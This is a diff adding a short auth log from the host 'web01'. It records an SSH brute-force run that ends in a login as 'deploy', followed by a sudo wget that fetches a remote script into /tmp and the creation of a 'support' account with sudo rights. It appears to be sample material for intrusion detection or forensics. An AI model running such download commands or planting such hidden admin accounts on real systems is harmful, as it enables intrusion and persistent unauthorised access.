@@ -1,0 +1,14 @@
+Oct 29 02:14:10 web01 sshd[2211]: Failed password for admin from 203.0.113.9 port 50000 ssh2
+Oct 29 02:14:13 web01 sshd[2211]: Failed password for invalid user root from 203.0.113.9 port 50001 ssh2
+Oct 29 02:14:16 web01 sshd[2211]: Failed password for oracle from 203.0.113.9 port 50002 ssh2
+Oct 29 02:14:19 web01 sshd[2211]: Failed password for invalid user test from 203.0.113.9 port 50003 ssh2
+Oct 29 02:14:22 web01 sshd[2211]: Failed password for ubuntu from 203.0.113.9 port 50004 ssh2
+Oct 29 02:14:25 web01 sshd[2211]: Failed password for invalid user deploy from 203.0.113.9 port 50005 ssh2
+Oct 29 02:14:28 web01 sshd[2211]: Failed password for git from 203.0.113.9 port 50006 ssh2
+Oct 29 02:14:31 web01 sshd[2211]: Failed password for invalid user postgres from 203.0.113.9 port 50007 ssh2
+Oct 29 02:15:02 web01 sshd[2211]: Accepted password for deploy from 203.0.113.9 port 50110 ssh2
+Oct 29 02:16:40 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://192.0.2.99/x.sh -O /tmp/x.sh
+Oct 29 02:17:05 web01 useradd[2290]: new user: name=support, UID=1002, GID=1002, home=/home/support, shell=/bin/bash
+Oct 29 02:17:09 web01 usermod[2295]: add 'support' to group 'sudo'
+Oct 29 09:01:13 web01 sshd[3001]: Accepted publickey for alice from 198.51.100.7 port 42110 ssh2
+Oct 29 09:05:00 web01 CRON[3010]: pam_unix(cron:session): session opened for user root by (uid=0)
